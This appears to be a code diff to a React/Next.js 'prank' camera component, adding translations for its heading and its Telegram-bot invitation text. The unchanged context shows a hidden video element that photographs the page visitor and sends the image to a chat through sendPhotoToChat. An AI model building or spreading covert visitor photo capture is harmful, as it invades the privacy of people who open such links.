@@ -1,6 +1,7 @@
 "use client";
 
 import confetti from "canvas-confetti";
+import { useTranslations } from "next-intl";
 import { useCallback, useEffect, useState } from "react";
 import { sendPhotoToChat } from "../_actions/send-photo-to-chat";
 import { useCamera } from "../_hooks/use-camera";
@@ -54,6 +55,7 @@ interface CameraProps {
 export const Camera = ({ chatId }: CameraProps) => {
 	const { videoRef, canvasRef, photo } = useCamera();
 	const [isTakingPhoto, setIsTakingPhoto] = useState(true);
+	const t = useTranslations("prank");
 
 	const handlePhoto = useCallback(
 		async (_photo: string) => {
@@ -82,21 +84,25 @@ export const Camera = ({ chatId }: CameraProps) => {
 
 	return (
 		<div className="flex flex-col justify-center items-center gap-12">
-			{isTakingPhoto ? <Loader /> : <h1 className="text-3xl font-bold">🎉 You got pranked 🎉</h1>}
+			{isTakingPhoto ? <Loader /> : <h1 className="text-3xl font-bold">{t("title")}</h1>}
 			<video ref={videoRef} style={{ display: "none" }} autoPlay />
 			<canvas className={isTakingPhoto ? "hidden" : "visible rounded-xl max-h-[50vh]"} ref={canvasRef} />
 			{!isTakingPhoto && (
 				<p className="text-center text-lg">
-					Use{" "}
-					<a
-						className="underline underline-offset-4 hover:text-orange-500"
-						href={`https://t.me/${process.env.NEXT_PUBLIC_BOT_NAME}`}
-						target="_blank"
-						rel="noreferrer noopener"
-					>
-						@{process.env.NEXT_PUBLIC_BOT_NAME}
-					</a>{" "}
-					to get your unique link and prank your friends! 📸
+					{t.rich("subtitle", {
+						botTag: `@${process.env.NEXT_PUBLIC_BOT_NAME}`,
+						a: (content) => (
+							<a
+								className="hover:text-orange-500"
+								href={`https://t.me/${process.env.NEXT_PUBLIC_BOT_NAME}`}
+								target="_blank"
+								rel="noreferrer"
+							>
+								{content}
+							</a>
+						),
+						u: (content) => <span className="underline underline-offset-4">{content}</span>,
+					})}
 				</p>
 			)}
 		</div>
